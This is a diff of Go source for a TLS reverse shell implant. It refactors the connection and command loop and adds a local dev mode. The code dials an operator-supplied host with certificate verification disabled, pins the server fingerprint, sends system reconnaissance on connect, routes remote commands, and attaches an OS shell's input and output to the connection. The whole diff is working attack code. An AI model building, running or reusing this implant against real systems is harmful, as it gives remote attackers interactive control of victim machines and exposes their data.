@@ -6,8 +6,8 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
+	"flag"
 	"fmt"
-	"net"
 	"os"
 	"strings"
 
@@ -22,23 +22,24 @@ const (
 	ErrBadFingerprint  = iota
 )
 
-var (
-	connectString string
-	fingerPrint   string
-)
+var connectString string
+var fingerPrint string
 
-func send(conn net.Conn, msg string) {
+type writer interface {
+	Write(s []byte) (int, error)
+	Read(s []byte) (int, error)
+}
+
+func send(conn writer, msg string) {
 	conn.Write([]byte("\n"))
 	conn.Write([]byte(msg))
 	conn.Write([]byte("\n"))
 }
 
-func interactiveShell(conn net.Conn) {
-	var (
-		name, _ = os.Hostname()
-		prompt  = fmt.Sprintf("\n[%s]> ", name)
-		scanner = bufio.NewScanner(conn)
-	)
+func startShell(conn writer) {
+	name, _ := os.Hostname()
+	prompt := fmt.Sprintf("\n[%s]> ", name)
+	scanner := bufio.NewScanner(conn)
 
 	// Print basic recon data on first connect
 	send(conn, sitrep.SysInfo())
@@ -46,26 +47,22 @@ func interactiveShell(conn net.Conn) {
 
 	for scanner.Scan() {
 		command := scanner.Text()
-		if command == "exit" {
-			break
-		} else if command == "shell" {
-			runShell(conn)
-		} else if len(command) > 1 {
+		switch command {
+		case "exit":
+			os.Exit(0)
+		case "shell":
+			cmd := shell.GetShell()
+			cmd.Stdout = conn
+			cmd.Stderr = conn
+			cmd.Stdin = conn
+			cmd.Run()
+		default:
 			argv := strings.Split(command, " ")
 			out := commands.Route(argv)
 			send(conn, out)
 		}
-
 		conn.Write([]byte(prompt))
 	}
-}
-
-func runShell(conn net.Conn) {
-	cmd := shell.GetShell()
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Stdin = conn
-	cmd.Run()
 }
 
 func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
@@ -81,24 +78,28 @@ func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
 }
 
 func initReverseShell(connectString string, fingerprint []byte) {
-	var (
-		conn *tls.Conn
-		err  error
-	)
-
 	config := &tls.Config{InsecureSkipVerify: true}
-	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
+	conn, err := tls.Dial("tcp", connectString, config)
+	if err != nil {
 		os.Exit(ErrHostUnreachable)
 	}
 	defer conn.Close()
 
-	if ok := isValidKey(conn, fingerprint); !ok {
+	ok := isValidKey(conn, fingerprint)
+	if !ok {
 		os.Exit(ErrBadFingerprint)
 	}
-	interactiveShell(conn)
+	startShell(conn)
 }
 
 func main() {
+	dev := flag.Bool("dev", false, "Run the shell locally")
+	flag.Parse()
+
+	if *dev {
+		startShell(os.Stdin)
+	}
+
 	if connectString != "" && fingerPrint != "" {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
